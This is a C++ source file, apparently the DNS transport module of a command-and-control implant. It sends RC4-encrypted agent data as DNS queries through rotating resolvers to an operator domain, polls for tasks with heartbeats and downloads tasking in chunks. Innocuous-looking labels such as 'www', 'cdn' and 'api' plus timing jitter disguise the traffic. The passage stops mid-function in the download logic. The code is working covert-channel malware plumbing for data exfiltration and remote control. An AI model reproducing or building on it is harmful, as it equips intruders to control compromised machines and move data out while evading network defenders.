#include "ConnectorDNS.h"
#include "DnsCodec.h"
#include "Crypt.h"
#include "utils.h"
#include "ApiLoader.h"

extern "C" int __cdecl _snprintf(char*, size_t, const char*, ...);

// Operators new/delete
void* ConnectorDNS::operator new(size_t sz)
{
    void* p = MemAllocLocal(sz);
    return p;
}

void ConnectorDNS::operator delete(void* p) noexcept
{
    MemFreeLocal(&p, sizeof(ConnectorDNS));
}

// Constructor - initialize DNSFUNC
ConnectorDNS::ConnectorDNS()
{
    this->functions = (DNSFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(DNSFUNC));
    if (!this->functions) return;

    this->functions->LocalAlloc    = ApiWin->LocalAlloc;
    this->functions->LocalReAlloc  = ApiWin->LocalReAlloc;
    this->functions->LocalFree     = ApiWin->LocalFree;
    this->functions->WSAStartup    = ApiWin->WSAStartup;
    this->functions->WSACleanup    = ApiWin->WSACleanup;
    this->functions->socket        = ApiWin->socket;
    this->functions->closesocket   = ApiWin->closesocket;
    this->functions->sendto        = ApiWin->sendto;
    this->functions->recvfrom      = ApiWin->recvfrom;
    this->functions->select        = ApiWin->select;
    this->functions->gethostbyname = ApiWin->gethostbyname;
    this->functions->Sleep         = ApiWin->Sleep;
    this->functions->GetTickCount  = ApiWin->GetTickCount;
}

// Destructor
ConnectorDNS::~ConnectorDNS()
{
    CloseConnector();
    if (this->functions) {
        this->functions->LocalFree(this->functions);
        this->functions = NULL;
    }
}

// Private helper: Initialize DNS metadata header
void ConnectorDNS::MetaV1Init(DNS_META_V1* h)
{
    if (!h) return;
    h->version = 1;
    h->metaFlags = 0;
    h->reserved = 0;
    h->downAckOffset = 0;
}

// Private helper: Build wire sequence number
ULONG ConnectorDNS::BuildWireSeq(ULONG logicalSeq, ULONG signalBits)
{
	ULONG seqCounter = logicalSeq & 0x0FFF;
	ULONG sig = signalBits & 0x0F;
	return (sig << 12) | seqCounter;
}

// Private helper: Parse resolver list
void ConnectorDNS::ParseResolvers(const CHAR* resolvers)
{
    this->resolverCount = 0;
    ZeroMemory(this->rawResolvers, sizeof(this->rawResolvers));
    for (ULONG i = 0; i < kMaxResolvers; ++i) {
        this->resolverList[i] = NULL;
        this->resolverFailCount[i] = 0;
        this->resolverDisabledUntil[i] = 0;
    }

    if (resolvers && resolvers[0]) {
        lstrcpynA(this->rawResolvers, resolvers, sizeof(this->rawResolvers));
        CHAR* p = this->rawResolvers;
        while (*p && this->resolverCount < kMaxResolvers) {
            while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' || *p == '\r' || *p == '\n') ++p;
            if (!*p) break;
            this->resolverList[this->resolverCount++] = p;
            while (*p && *p != ',' && *p != ';' && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') ++p;
            if (*p) *p++ = '\0';
        }
    }

    if (this->resolverCount == 0) {
        lstrcpynA(this->rawResolvers, "1.1.1.1", sizeof(this->rawResolvers));
        this->resolverList[0] = this->rawResolvers;
        this->resolverCount = 1;
    }
}

// Private helper: Build ACK data buffer
void ConnectorDNS::BuildAckData(BYTE* ackData, ULONG ackOffset, ULONG nonce, ULONG taskNonce)
{
    ackData[0] = (BYTE)((ackOffset >> 24) & 0xFF);
    ackData[1] = (BYTE)((ackOffset >> 16) & 0xFF);
    ackData[2] = (BYTE)((ackOffset >> 8) & 0xFF);
    ackData[3] = (BYTE)((ackOffset >> 0) & 0xFF);
    ackData[4] = (BYTE)((nonce >> 24) & 0xFF);
    ackData[5] = (BYTE)((nonce >> 16) & 0xFF);
    ackData[6] = (BYTE)((nonce >> 8) & 0xFF);
    ackData[7] = (BYTE)((nonce >> 0) & 0xFF);
    ackData[8] = (BYTE)((taskNonce >> 24) & 0xFF);
    ackData[9] = (BYTE)((taskNonce >> 16) & 0xFF);
    ackData[10] = (BYTE)((taskNonce >> 8) & 0xFF);
    ackData[11] = (BYTE)((taskNonce >> 0) & 0xFF);
}

// Private helper: Reset download state
void ConnectorDNS::ResetDownload()
{
    if (this->downBuf && this->downTotal) {
        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
    }
    this->downBuf = NULL;
    this->downTotal = 0;
    this->downFilled = 0;
    this->downAckOffset = 0;
    this->downTaskNonce = 0;
    this->hasPendingTasks = FALSE;
}

// Reset upload state for retry
void ConnectorDNS::ResetUploadState()
{
    memset(this->confirmedOffsets, 0, sizeof(this->confirmedOffsets));
    this->confirmedCount = 0;
    this->lastAckNextExpected = 0;
    this->uploadNeedsReset = FALSE;
    this->uploadStartTime = 0;
}

// Check if offset was confirmed by server
BOOL ConnectorDNS::IsOffsetConfirmed(ULONG offset)
{
    for (ULONG i = 0; i < this->confirmedCount && i < kMaxTrackedOffsets; i++) {
        if (this->confirmedOffsets[i] == offset) {
            return TRUE;
        }
    }
    return FALSE;
}

// Mark offset as confirmed
void ConnectorDNS::MarkOffsetConfirmed(ULONG offset)
{
    if (this->confirmedCount >= kMaxTrackedOffsets) {
        return;
    }
    if (!IsOffsetConfirmed(offset)) {
        this->confirmedOffsets[this->confirmedCount++] = offset;
    }
}

// Parse PUT ACK response from A record
// Format: [flags:1][nextExpectedOff:3 (big-endian 24-bit)]
// Flags: 0x01 = complete, 0x02 = needs_reset
BOOL ConnectorDNS::ParsePutAckResponse(BYTE* response, ULONG respLen, 
                                        ULONG* outNextExpected, BOOL* outComplete, BOOL* outNeedsReset)
{
    if (!response || respLen < 4) {
        return FALSE;
    }

    // Response should be 4 bytes (A record IP)
    BYTE flags = response[0];
    ULONG nextExpected = ((ULONG)response[1] << 16) | 
                         ((ULONG)response[2] << 8) | 
                         (ULONG)response[3];

    if (outComplete) {
        *outComplete = (flags & 0x01) ? TRUE : FALSE;
    }
    if (outNeedsReset) {
        *outNeedsReset = (flags & 0x02) ? TRUE : FALSE;
    }
    if (outNextExpected) {
        *outNextExpected = nextExpected;
    }

    return TRUE;
}

// Private helper: Single DNS query
BOOL ConnectorDNS::QuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR* qtypeStr,
                                BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
	*outSize = 0;
    if (!this->functions || !this->functions->WSAStartup || !this->functions->socket ||
        !this->functions->sendto || !this->functions->recvfrom || !this->functions->closesocket)
		return FALSE;

	WSADATA wsaData;
    if (this->functions->WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return FALSE;

    SOCKET s = this->functions->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (s == INVALID_SOCKET) {
        this->functions->WSACleanup();
		return FALSE;
	}

	const CHAR* resolver = (resolverIP && resolverIP[0]) ? resolverIP : "1.1.1.1";

    HOSTENT* he = this->functions->gethostbyname(resolver);
	if (!he || !he->h_addr_list || !he->h_addr_list[0]) {
        this->functions->closesocket(s);
        this->functions->WSACleanup();
		return FALSE;
	}

	sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = _htons(53);
	memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

    // Build DNS query
	BYTE query[4096];
	memset(query, 0, sizeof(query));
    USHORT id = (USHORT)(this->functions->GetTickCount() & 0xFFFF);
	query[0] = (BYTE)(id >> 8);
	query[1] = (BYTE)(id & 0xFF);
	query[2] = 0x01;
	query[3] = 0x00;
	query[4] = 0x00;
	query[5] = 0x01;

	int offset = 12;
	int nameLen = DnsCodec::EncodeName(qname, query + offset, sizeof(query) - offset - 4);
	if (nameLen < 0) {
        this->functions->closesocket(s);
        this->functions->WSACleanup();
		return FALSE;
	}
	offset += nameLen;

    // Determine query type
    USHORT qtypeCode = 16; // TXT default
	if (qtypeStr && qtypeStr[0]) {
		CHAR qt[8];
		memset(qt, 0, sizeof(qt));
		int qi = 0;
		while (qtypeStr[qi] && qi < (int)sizeof(qt) - 1) {
			CHAR c = qtypeStr[qi];
			if (c >= 'a' && c <= 'z')
				c = (CHAR)(c - 'a' + 'A');
			qt[qi++] = c;
		}
		qt[qi] = '\0';
		if (qt[0] == 'A' && qt[1] == '\0') {
			qtypeCode = 1;
		} else if (qt[0] == 'A' && qt[1] == 'A' && qt[2] == 'A' && qt[3] == 'A' && qt[4] == '\0') {
			qtypeCode = 28;
		}
	}
	query[offset++] = (BYTE)(qtypeCode >> 8);
	query[offset++] = (BYTE)(qtypeCode & 0xFF);
	query[offset++] = 0x00;
	query[offset++] = 0x01;

    // Send query
    int sent = this->functions->sendto(s, (const char*)query, offset, 0, (sockaddr*)&addr, sizeof(addr));
	if (sent != offset) {
        this->functions->closesocket(s);
        this->functions->WSACleanup();
		return FALSE;
	}

    // Wait for response with timeout
	fd_set readfds;
	readfds.fd_count = 1;
	readfds.fd_array[0] = s;
	timeval timeout;
    timeout.tv_sec = kQueryTimeout;
	timeout.tv_usec = 0;

    int selResult = this->functions->select(0, &readfds, NULL, NULL, &timeout);
    if (selResult <= 0) {
        this->functions->closesocket(s);
        this->functions->WSACleanup();
		return FALSE;
	}

    // Receive response
    BYTE resp[1024];
    memset(resp, 0, sizeof(resp));
	int addrLen = sizeof(addr);
    int recvLen = this->functions->recvfrom(s, (char*)resp, sizeof(resp), 0, (sockaddr*)&addr, &addrLen);

    this->functions->closesocket(s);
    this->functions->WSACleanup();

    if (recvLen <= 12)
		return FALSE;

    // Parse DNS response
	int qdcount = (resp[4] << 8) | resp[5];
	int ancount = (resp[6] << 8) | resp[7];
	int pos = 12;

    // Skip questions
	for (int qi = 0; qi < qdcount; ++qi) {
		while (pos < recvLen && resp[pos] != 0) {
			if ((resp[pos] & 0xC0) == 0xC0) {
				pos += 2;
				break;
			}
			pos += resp[pos] + 1;
		}
		pos++;
		pos += 4;
	}

    // Parse answers
	ULONG written = 0;
	for (int ai = 0; ai < ancount; ++ai) {
		if (pos + 12 > recvLen)
			return FALSE;
		if ((resp[pos] & 0xC0) == 0xC0)
			pos += 2;
		else {
			while (pos < recvLen && resp[pos] != 0) {
				pos += resp[pos] + 1;
			}
			pos++;
		}
		USHORT type = (resp[pos] << 8) | resp[pos + 1];
		pos += 2;
        pos += 2; // class
        pos += 4; // TTL
		USHORT rdlen = (resp[pos] << 8) | resp[pos + 1];
		pos += 2;
		if (pos + rdlen > recvLen)
			return FALSE;

		if (qtypeCode == 16 && type == 16 && rdlen > 0) {
            // TXT record
			USHORT consumed = 0;
			ULONG txtWritten = 0;
			while (consumed < rdlen) {
				if (pos + consumed >= recvLen)
					break;
				BYTE txtLen = resp[pos + consumed];
				consumed++;
				if (consumed + txtLen > rdlen)
					break;
                if (txtLen > 0 && txtWritten + txtLen <= outBufSize) {
						memcpy(outBuf + txtWritten, resp + pos + consumed, txtLen);
						txtWritten += txtLen;
				}
				consumed += txtLen;
			}
			if (txtWritten > 0) {
				*outSize = txtWritten;
				return TRUE;
			}
		} else if (qtypeCode == 1 && type == 1 && rdlen >= 4) {
            // A record
			if (written + 4 <= outBufSize) {
				memcpy(outBuf + written, resp + pos, 4);
				written += 4;
			}
		} else if (qtypeCode == 28 && type == 28 && rdlen >= 16) {
            // AAAA record
			if (written + 16 <= outBufSize) {
				memcpy(outBuf + written, resp + pos, 16);
				written += 16;
			}
		}
		pos += rdlen;
	}

    if ((qtypeCode == 1 || qtypeCode == 28) && written > 0) {
			*outSize = written;
			return TRUE;
	}

	return FALSE;
}

BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize, ULONG sleepDelaySeconds)
{
    this->profile = profile;
    this->sleepDelaySeconds = sleepDelaySeconds;

    ParseResolvers((CHAR*)profile.resolvers);

    if (!profile.encrypt_key)
        return FALSE;
    memset(this->encryptKey, 0, sizeof(this->encryptKey));
    memcpy(this->encryptKey, profile.encrypt_key, 16);

    this->pktSize = profile.pkt_size ? profile.pkt_size : kDefaultPktSize;
    if (this->pktSize > kMaxPktSize)
        this->pktSize = kMaxPktSize;

    this->labelSize = profile.label_size ? profile.label_size : kDefaultLabelSize;
    if (this->labelSize == 0 || this->labelSize > kMaxLabelSize)
        this->labelSize = kDefaultLabelSize;

    if (profile.domain)
        lstrcpynA(this->domain, (CHAR*)profile.domain, sizeof(this->domain));
    else
        this->domain[0] = 0;

    lstrcpynA(this->qtype, (CHAR*)"TXT", sizeof(this->qtype));

    if (!beat || !beatSize || beatSize < 8)
        return FALSE;

    // Extract agent ID from beat
    BYTE* beatCopy = (BYTE*)MemAllocLocal(beatSize);
    if (!beatCopy)
        return FALSE;
    memcpy(beatCopy, beat, beatSize);

    EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);

    ULONG agentId = 0;
    if (beatSize >= 8) {
        agentId |= ((ULONG)beatCopy[4] << 24);
        agentId |= ((ULONG)beatCopy[5] << 16);
        agentId |= ((ULONG)beatCopy[6] << 8);
        agentId |= ((ULONG)beatCopy[7] << 0);
    }
    MemFreeLocal((LPVOID*)&beatCopy, beatSize);

    _snprintf(this->sid, sizeof(this->sid), "%08x", agentId);

    // Store beat for HI message
    if (beat && beatSize) {
        this->hiBeat = (BYTE*)MemAllocLocal(beatSize);
        if (this->hiBeat) {
            memcpy(this->hiBeat, beat, beatSize);
            this->hiBeatSize = beatSize;
            this->hiRetries = kMaxRetries;
            this->hiSent = FALSE;
        }
    }

    this->initialized = TRUE;
    return TRUE;
}

void ConnectorDNS::CloseConnector()
{
    if (this->recvData) {
		MemFreeLocal((LPVOID*)&this->recvData, (ULONG)this->recvSize);
		this->recvData = NULL;
		this->recvSize = 0;
    }
    if (this->hiBeat && this->hiBeatSize) {
        MemFreeLocal((LPVOID*)&this->hiBeat, this->hiBeatSize);
        this->hiBeat = NULL;
        this->hiBeatSize = 0;
    }
    if (this->downBuf && this->downTotal) {
        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
        this->downBuf = NULL;
        this->downTotal = 0;
        this->downFilled = 0;
    }
}

void ConnectorDNS::UpdateResolvers(BYTE* resolvers)
{
	this->profile.resolvers = resolvers;
    ParseResolvers((CHAR*)resolvers);
}

BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, 
                                      BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
	*outSize = 0;

    if (this->resolverCount == 0)
		return FALSE;

	for (ULONG i = 0; i < this->resolverCount; ++i) {
		ULONG idx = (this->currentResolverIndex + i) % this->resolverCount;
		CHAR* resolver = this->resolverList[idx];
		if (!resolver || !*resolver) continue;

        ULONG nowTick = this->functions->GetTickCount();
        if (this->resolverDisabledUntil[idx] && nowTick < this->resolverDisabledUntil[idx])
			continue;

        if (QuerySingle(qname, resolver, qtypeStr, outBuf, outBufSize, outSize)) {
			this->currentResolverIndex = idx;
			this->resolverFailCount[idx] = 0;
			this->resolverDisabledUntil[idx] = 0;
			return TRUE;
		}

		this->resolverFailCount[idx]++;

        if (this->resolverFailCount[idx] >= kMaxFailCount) {
			ULONG backoff = 30000;
			if (this->sleepDelaySeconds > 0) {
				ULONG b = this->sleepDelaySeconds * 2000;
				if (b < 5000) b = 5000;
				if (b > 30000) b = 30000;
				backoff = b;
			}
            ULONG jitter = this->functions->GetTickCount() & 0x0FFF;
            this->resolverDisabledUntil[idx] = this->functions->GetTickCount() + backoff + jitter;
			this->resolverFailCount[idx] = 0;
		}
	}

	return FALSE;
}

// Private helper: Send heartbeat (HB) request
void ConnectorDNS::SendHeartbeat()
{
    CHAR qnameA[512];
    ULONG hbNonce = this->functions->GetTickCount() ^ (this->seq * 7919);
    BYTE hbData[kAckDataSize];
    BuildAckData(hbData, this->downAckOffset, hbNonce, this->downTaskNonce);
    EncryptRC4(hbData, kAckDataSize, this->encryptKey, 16);

    CHAR hbLabel[32];
    memset(hbLabel, 0, sizeof(hbLabel));
    DnsCodec::Base32Encode(hbData, kAckDataSize, hbLabel, sizeof(hbLabel));

    ULONG hbLogicalSeq = this->seq + 1;
    ULONG hbWireSeq = BuildWireSeq(hbLogicalSeq, kDnsSignalBits);
    DnsCodec::BuildQName(this->sid, "hb", hbWireSeq, this->idx, hbLabel, this->domain, qnameA, sizeof(qnameA));

    BYTE ipBuf[16];
    ULONG ipSize = 0;
    if (QueryWithRotation(qnameA, "A", ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
        this->lastQueryOk = TRUE;
        
        // Parse HB response: [flags:1][reserved:3]
        // Flags: 0x01 = has pending tasks, 0x02 = needs_reset
        BYTE flags = ipBuf[0];
        BOOL hasPending = (flags & 0x01) != 0;
        BOOL needsReset = (flags & 0x02) != 0;

        if (needsReset) {
            // Server indicates our upload was lost - reset upload state
            this->uploadNeedsReset = TRUE;
            ResetUploadState();
        }

        if (!hasPending) {
            this->seq++;
            this->downAckOffset = 0;
            this->hasPendingTasks = FALSE;
            return;
        }
        this->hasPendingTasks = TRUE;
        this->seq++;
    } else {
        this->lastQueryOk = FALSE;
    }
}

// Private helper: Send ACK after upload
void ConnectorDNS::SendAck()
{
    ULONG ackNonce = this->functions->GetTickCount() ^ (this->seq * 7919) ^ 0xACEACE;
    BYTE ackData[kAckDataSize];
    BuildAckData(ackData, this->downAckOffset, ackNonce, this->downTaskNonce);
    EncryptRC4(ackData, kAckDataSize, this->encryptKey, 16);

    CHAR ackLabel[32];
    memset(ackLabel, 0, sizeof(ackLabel));
    DnsCodec::Base32Encode(ackData, kAckDataSize, ackLabel, sizeof(ackLabel));

    CHAR ackQname[256];
    DnsCodec::BuildQName(this->sid, "hb", ++this->seq, this->idx, ackLabel, this->domain, ackQname, sizeof(ackQname));

    BYTE tmp[16];
    ULONG tmpSize = 0;
    QueryWithRotation(ackQname, "A", tmp, sizeof(tmp), &tmpSize);
}

// Private helper: Finalize completed download
void ConnectorDNS::FinalizeDownload()
{
    BYTE* finalBuf = this->downBuf;
    ULONG finalSize = this->downTotal;

    if (this->downTotal > kFrameHeaderSize) {
        BYTE flags = this->downBuf[0];
        ULONG orig = 0;
        orig |= (ULONG)this->downBuf[5];
        orig |= ((ULONG)this->downBuf[6] << 8);
        orig |= ((ULONG)this->downBuf[7] << 16);
        orig |= ((ULONG)this->downBuf[8] << 24);

        if ((flags & 0x1) && orig > 0 && orig <= kMaxDownloadSize) {
            // Compressed data
            BYTE* outBuf = NULL;
            if (DnsCodec::Decompress(this->downBuf + kFrameHeaderSize, 
                                  this->downTotal - kFrameHeaderSize, &outBuf, orig) && outBuf) {
                finalBuf = outBuf;
                finalSize = orig;
                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                this->downBuf = NULL;
            }
        } else if (flags == 0 && orig > 0 && orig <= this->downTotal - kFrameHeaderSize) {
            // Uncompressed data
            BYTE* outBuf = (BYTE*)MemAllocLocal(orig);
            if (outBuf) {
                memcpy(outBuf, this->downBuf + kFrameHeaderSize, orig);
                finalBuf = outBuf;
                finalSize = orig;
                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                this->downBuf = NULL;
            }
        }
    }

    this->recvData = finalBuf;
    this->recvSize = (int)finalSize;
    this->lastDownTotal = finalSize;
    this->downAckOffset = this->downTotal;
    this->downBuf = NULL;
    this->downTotal = 0;
    this->downFilled = 0;
    this->hasPendingTasks = FALSE;
}

void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
{
    ULONG pkt = this->pktSize ? this->pktSize : kDefaultPktSize;
    if (pkt > kMaxPktSize)
        pkt = kMaxPktSize;

    CHAR dataLabel[1024];
    CHAR qname[512];

    // Handle HI message (first contact)
    if (!this->hiSent && data && data_size) {
        memset(dataLabel, 0, sizeof(dataLabel));
        memset(qname, 0, sizeof(qname));

        ULONG maxBuf = pkt;
        if (maxBuf > kMaxSafeFrame)
            maxBuf = kMaxSafeFrame;
        if (data_size && maxBuf > data_size)
            maxBuf = data_size;

        BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
        if (!encBuf)
            return;
        memcpy(encBuf, data, maxBuf);
        if (!DnsCodec::BuildDataLabels(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
            MemFreeLocal((LPVOID*)&encBuf, maxBuf);
            return;
        }
        MemFreeLocal((LPVOID*)&encBuf, maxBuf);

        ULONG hiWireSeq = BuildWireSeq(this->seq, kDnsSignalBits);
        DnsCodec::BuildQName(this->sid, "www", hiWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));

        BYTE tmp[512];
        ULONG tmpSize = 0;
        this->lastQueryOk = QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize);
        if (this->lastQueryOk) {
            this->hiSent = TRUE;
        } else if (this->hiRetries > 0) {
                this->hiRetries--;
        }
        return;
    }

    // Handle data upload
    if (data && data_size) {
        this->lastQueryOk = TRUE;
        ULONG total = data_size;
        ULONG maxChunk = pkt;
        if (maxChunk <= kHeaderSize)
            maxChunk = kHeaderSize + 1;
        maxChunk -= kHeaderSize;

        if (maxChunk + kHeaderSize > kMaxSafeFrame)
            maxChunk = kMaxSafeFrame - kHeaderSize;

        if (total > kMaxUploadSize)
            total = kMaxUploadSize;

        // Reset upload tracking state
        ResetUploadState();
        this->uploadStartTime = this->functions->GetTickCount();

        ULONG seqForSend = ++this->seq;
        ULONG offset = 0;
        BOOL uploadComplete = FALSE;
        int maxUploadRetries = 5;

        while (!uploadComplete && maxUploadRetries > 0) {
            // Find next unconfirmed offset
            ULONG sendOffset = offset;
            while (sendOffset < total && IsOffsetConfirmed(sendOffset)) {
                sendOffset += maxChunk;
            }
            
            if (sendOffset >= total) {
                // All offsets confirmed
                uploadComplete = TRUE;
                break;
            }

            ULONG chunk = total - sendOffset;
            if (chunk > maxChunk)
                chunk = maxChunk;

            ULONG frameSize = kHeaderSize + chunk;
            BYTE* frame = (BYTE*)MemAllocLocal(frameSize);
            if (!frame)
                return;

            DNS_META_V1 meta;
            MetaV1Init(&meta);
            if (this->downAckOffset > 0) {
                meta.metaFlags |= 0x01;
                meta.downAckOffset = this->downAckOffset;
            }
            memcpy(frame, &meta, kMetaSize);
            frame[kMetaSize + 0] = (BYTE)((total >> 24) & 0xFF);
            frame[kMetaSize + 1] = (BYTE)((total >> 16) & 0xFF);
            frame[kMetaSize + 2] = (BYTE)((total >> 8) & 0xFF);
            frame[kMetaSize + 3] = (BYTE)((total >> 0) & 0xFF);
            frame[kMetaSize + 4] = (BYTE)((sendOffset >> 24) & 0xFF);
            frame[kMetaSize + 5] = (BYTE)((sendOffset >> 16) & 0xFF);
            frame[kMetaSize + 6] = (BYTE)((sendOffset >> 8) & 0xFF);
            frame[kMetaSize + 7] = (BYTE)((sendOffset >> 0) & 0xFF);
            memcpy(frame + kHeaderSize, data + sendOffset, chunk);

            EncryptRC4(frame, frameSize, this->encryptKey, 16);

            memset(dataLabel, 0, sizeof(dataLabel));
            if (!DnsCodec::BuildDataLabels(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
                MemFreeLocal((LPVOID*)&frame, frameSize);
                return;
            }
            MemFreeLocal((LPVOID*)&frame, frameSize);

            ULONG putWireSeq = BuildWireSeq(seqForSend, kDnsSignalBits);
            DnsCodec::BuildQName(this->sid, "cdn", putWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));

            BYTE tmp[512];
            ULONG tmpSize = 0;
            BOOL putOk = FALSE;
            for (int retry = 0; retry < 3 && !putOk; retry++) {
                if (retry > 0) {
                    this->functions->Sleep(100 + (this->functions->GetTickCount() % 50));
                }
                putOk = QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize);
            }
            
            if (!putOk) {
                this->lastQueryOk = FALSE;
                maxUploadRetries--;
                continue;
            }

            // Parse PUT ACK response
            ULONG nextExpected = 0;
            BOOL complete = FALSE;
            BOOL needsReset = FALSE;
            if (tmpSize >= 4 && ParsePutAckResponse(tmp, tmpSize, &nextExpected, &complete, &needsReset)) {
                if (needsReset) {
                    // Server requested upload reset - restart from beginning
                    ResetUploadState();
                    offset = 0;
                    maxUploadRetries--;
                    continue;
                }
                if (complete) {
                    uploadComplete = TRUE;
                    break;
                }
                // Mark current offset as confirmed
                MarkOffsetConfirmed(sendOffset);
                this->lastAckNextExpected = nextExpected;
                
                // Check if server expects a different offset (gap detected)
                if (nextExpected < sendOffset && !IsOffsetConfirmed(nextExpected)) {
                    // Server wants us to resend an earlier fragment
                    offset = nextExpected;
                } else {
                    offset = sendOffset + chunk;
                }
            } else {
                // Failed to parse response, assume current offset is ok and continue
                MarkOffsetConfirmed(sendOffset);
                offset = sendOffset + chunk;
            }

            ULONG pacing = 30 + (this->functions->GetTickCount() % 20);
            this->functions->Sleep(pacing);
        }

        if (uploadComplete || offset >= total) {
            this->lastUpTotal = total;
            this->lastQueryOk = TRUE;
        } else {
            this->lastQueryOk = FALSE;
        }
        
        // Send ACK if needed
        if (this->downAckOffset > 0) {
            SendAck();
        }
        return;
    }

    // Handle HI retry
    if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
        memset(dataLabel, 0, sizeof(dataLabel));
        memset(qname, 0, sizeof(qname));

        ULONG retrySize = this->hiBeatSize;
        if (retrySize > pkt)
            retrySize = pkt;

        BYTE* encBuf = (BYTE*)MemAllocLocal(retrySize);
        if (!encBuf)
            return;
        memcpy(encBuf, this->hiBeat, retrySize);
        if (!DnsCodec::BuildDataLabels(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
            MemFreeLocal((LPVOID*)&encBuf, retrySize);
            return;
        }
        MemFreeLocal((LPVOID*)&encBuf, retrySize);

        ULONG hiRetryWireSeq = BuildWireSeq(this->seq, kDnsSignalBits);
        DnsCodec::BuildQName(this->sid, "www", hiRetryWireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));

        BYTE tmp[512];
        ULONG tmpSize = 0;
        if (QueryWithRotation(qname, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
            this->hiSent = TRUE;
            this->lastQueryOk = TRUE;
        } else {
            this->lastQueryOk = FALSE;
            if (this->hiRetries > 0)
                this->hiRetries--;
        }
        return;
    }

    // Send heartbeat if no pending download
    if (!this->forcePoll && !this->downBuf && !this->hasPendingTasks && this->qtype[0] == 'T') {
        SendHeartbeat();
                return;
    }

    if (this->forcePoll) {
        this->forcePoll = FALSE;
    }

    // Handle download (GET)
    ULONG reqOffset = this->downFilled;
    ULONG nonce = this->functions->GetTickCount() ^ (this->seq << 16) ^ (reqOffset * 31337);
    
    BYTE reqData[kReqDataSize];
    reqData[0] = (BYTE)((reqOffset >> 24) & 0xFF);
    reqData[1] = (BYTE)((reqOffset >> 16) & 0xFF);
    reqData[2] = (BYTE)((reqOffset >> 8) & 0xFF);
    reqData[3] = (BYTE)((reqOffset >> 0) & 0xFF);
    reqData[4] = (BYTE)((nonce >> 24) & 0xFF);
    reqData[5] = (BYTE)((nonce >> 16) & 0xFF);
    reqData[6] = (BYTE)((nonce >> 8) & 0xFF);
    reqData[7] = (BYTE)((nonce >> 0) & 0xFF);
    EncryptRC4(reqData, kReqDataSize, this->encryptKey, 16);

    CHAR reqLabel[24];
    memset(reqLabel, 0, sizeof(reqLabel));
    DnsCodec::Base32Encode(reqData, kReqDataSize, reqLabel, sizeof(reqLabel));
    
    ULONG logicalSeq = ++this->seq;
    ULONG getWireSeq = BuildWireSeq(logicalSeq, kDnsSignalBits);
    memset(qname, 0, sizeof(qname));
    DnsCodec::BuildQName(this->sid, "api", getWireSeq, this->idx, reqLabel, this->domain, qname, sizeof(qname));

    BYTE respBuf[1024];
    ULONG respSize = 0;
    if (QueryWithRotation(qname, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
        this->lastQueryOk = TRUE;

        if (respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K')
            return;

        BYTE binBuf[1024];
        int binLen = DnsCodec::Base64Decode((const CHAR*)respBuf, respSize, binBuf, sizeof(binBuf));
        if (binLen <= 0) {
            ResetDownload();
            return;
        }

        DecryptRC4(binBuf, binLen, this->encryptKey, 16);

        const ULONG headerSize = 8;
        if (binLen > (int)headerSize) {
            ULONG total = 0;
            ULONG offset = 0;
            total |= ((ULONG)binBuf[0] << 24);
            total |= ((ULONG)binBuf[1] << 16);
            total |= ((ULONG)binBuf[2] << 8);
            total |= ((ULONG)binBuf[3] << 0);
            offset |= ((ULONG)binBuf[4] << 24);
            offset |= ((ULONG)binBuf[5] << 16);
            offset |= ((ULONG)binBuf[6] << 8);
            offset |= ((ULONG)binBuf[7] << 0);
            ULONG chunkLen = binLen - headerSize;

            if (total > kMaxDownloadSize) {
                ResetDownload();
                return;
            }
            
            if (total > 0 && total <= kMaxDownloadSize && offset < total) {
                // Extract task nonce from first chunk (if this is offset 0)
                ULONG chunkTaskNonce = 0;
                if (offset == 0 && chunkLen >= 9) {
                    chunkTaskNonce |= (ULONG)binBuf[headerSize + 1];
                    chunkTaskNonce |= ((ULONG)binBuf[headerSize + 2] << 8);
                    chunkTaskNonce |= ((ULONG)binBuf[headerSize + 3] << 16);
                    chunkTaskNonce |= ((ULONG)binBuf[headerSize + 4] << 24);
                }
                
                // Determine if this is a new task or continuation
                BOOL isNewTask = FALSE;
                BOOL isValidContinuation = FALSE;
                
                if (!this->downBuf || this->downTotal == 0) {
                    // No current download - this must be a new task
                    isNewTask = TRUE;
                } else if (this->downTotal != total) {
                    // Different total size - definitely a new task
                    isNewTask = TRUE;
                } else if (offset == 0 && chunkTaskNonce != 0) {
                    // Offset 0 chunk with nonce - check if it's a new task
                    if (chunkTaskNonce != this->downTaskNonce) {
                        // Different nonce - new task
                        isNewTask = TRUE;
                    } else if (this->downFilled > 0) {
                        // Same nonce but we already have data - this is a retransmission
                        // Ignore if we've already acked this
                        if (this->downAckOffset > 0) {
                            return;
                        }
                    }
                } else {
                    // Continuation chunk - validate offset
                    isValidContinuation = TRUE;
                }
                
                // Handle offset mismatch for continuation chunks
                if (isValidContinuation && offset != reqOffset) {
